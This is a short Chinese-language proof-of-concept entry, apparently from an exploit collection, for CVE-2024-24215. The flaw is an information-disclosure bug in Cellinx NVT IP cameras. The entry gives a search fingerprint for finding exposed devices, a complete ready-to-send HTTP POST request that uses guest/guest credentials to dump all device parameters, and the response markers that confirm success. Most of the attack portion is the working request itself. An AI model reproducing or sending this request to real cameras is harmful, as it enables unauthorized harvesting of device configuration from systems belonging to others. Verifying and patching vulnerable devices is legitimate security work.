﻿# Cellinx NVT Web Server 信息泄露漏洞

> 更新时间：2024-02-20

> 漏洞编号：CVE-2024-24215

> 漏洞说明：Cellinx NVT IP PTZ 是韩国Cellinx公司的一个摄像机设备。Cellinx NVT 摄像机 GetJsonValue.cgi 接口处存在信息泄露漏洞，攻击者可以利用此漏洞获取敏感信息。

> 漏洞特征：body="local/NVT-string.js" 

> 验证脚本：HTTP

```
POST /cgi-bin/GetJsonValue.cgi?TYPE=json HTTP/1.1
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json; charset=utf-8
X-Requested-With: XMLHttpRequest
Connection: close

 {"jsonData":{"username":"guest","password":"guest","file":"param","data":"All"}}
```

> 响应代码特征：200

> 响应内容特征：ProductCode

> 上传文件定位：


> 验证文件来源：Cellinx NVT Web Server 信息泄露漏洞.poc
